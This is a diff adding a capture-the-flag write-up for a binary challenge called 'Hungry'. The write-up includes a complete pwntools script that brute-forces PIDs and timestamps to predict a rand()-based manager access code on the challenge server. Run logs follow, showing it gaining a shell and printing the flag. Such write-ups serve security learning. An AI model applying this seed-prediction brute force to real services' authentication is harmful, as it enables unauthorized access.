@@ -225,7 +225,7 @@ pop rdi;ret
 ## Resources:
 Suraj my goated mentor ^^
 
-# 3. IQ Test
+# 4. IQ Test
 
 ---
 
@@ -417,5 +417,185 @@ p.interactive()
 ## Resources:
 .
 
+# 5. Hungry
 
+---
+
+##  Challenge Description
+
+> Bruteforcing
+
+---
+
+##  Files Provided
+
+- `burgers_are_mid` – ELF 64-bit binary
+
+
+```bash
+Welcome to BitBurger, home of the Bit Burger! May I take your order?
+
+What would you like on your Bit Burger?
+ - a bun (y/n)? n
+ - a patty (y/n)? $
+
+```
+## Initial Recon
+> 1.Running the elf file and analysing the output <br>
+> 2. File prompts user to enter inputs <br>
+> 3. Asks for ingredients and stuff <Br>
+> 4. Pixelated pickels? really? <br>
+> 5. Well yeah normally running the program wasnt going to work because i dont need any of that linux mint on my bit burger <br>
+
+## Vulnerability analsyis
+> 1. Opening the file in IDA<br>
+
+<img width="630" height="501" alt="image" src="https://github.com/user-attachments/assets/09c4a1e7-3e01-497d-b06d-693b692c909b" />
+
+ <Br>
+ > 2. We have to enter "$" to get access to manager_control_panel() then proceed
+ > 3. analyzing managar_control_panel() in IDA<Br>
+ 
+<img width="503" height="401" alt="image" src="https://github.com/user-attachments/assets/61347594-5267-487f-aa10-6509e66aec24" />
+<Br>
+
+
+## Exploit strat
+> 1. Brute forcing PID on remote server
+> 2. Use the same libc functions as the file<Br>
+> 3. Pray to god<br>
+
+
+#
+### Exploit script <Again im sorry this is a bit hurried ill furnish it properly later>
+Chaining everything together we get the following script<BR>
+```python
+#!/usr/bin/env python3
+from pwn import *
+from ctypes import CDLL
+import time
+
+# Configuration
+HOST = 'hunger.nitephase.live'
+PORT = 53791
+
+# Load libc for rand()
+libc = CDLL('libc.so.6')
+
+def exploit():
+    # Try different time offsets and PID ranges
+    base_time = int(time.time())
+    
+    # Try times around current time
+    for time_offset in range(-2, 3):
+        current_time = base_time + time_offset
+        log.info(f"Trying with time: {current_time} (offset: {time_offset})")
+        
+        # Try PIDs in reasonable range
+        for pid in range(1, 5000):
+            io = None
+            try:
+                # Connect to server
+                io = remote(HOST, PORT)
+                
+                # Navigate to manager panel
+                io.recvuntil(b'a bun (y/n)?')
+                io.sendline(b'$')
+                
+                # Calculate the code for this seed
+                seed = current_time ^ pid
+                libc.srand(seed)
+                code = libc.rand() % 1000000
+                
+                if pid % 100 == 0:
+                    log.info(f"Trying PID {pid}, code: {code}")
+                
+                # Enter the code
+                io.recvuntil(b'Enter manager access code: ')
+                io.sendline(str(code).encode())
+                
+                # Check response
+                response = io.recvline(timeout=1)
+                
+                if b"Access granted" in response:
+                    log.success(f"Success! Time: {current_time}, PID: {pid}, Code: {code}")
+                    log.info("Dropping to interactive shell...")
+                    io.interactive()
+                    return True
+                
+                io.close()
+                
+            except Exception as e:
+                if io:
+                    io.close()
+                continue
+    
+    log.error("Failed to find correct code")
+    return False
+
+if __name__ == '__main__':
+    exploit()  
+
+```
+```bash
+garri@LAPTOP-J4CRR4GO:/mnt/c/Users/garri/Desktop/JTP-2/binex/hungry/src$ python3 ex.py
+[*] Trying with time: 1765061420 (offset: -2)
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[+] Success! Time: 1765061420, PID: 23, Code: 368793
+[*] Dropping to interactive shell...
+[*] Switching to interactive mode
+$ cat flag.txt
+nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
+```
+### plain old cat to finish the deal
+```
+# flag: ite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
+
+```
+## Resources:
+.
 
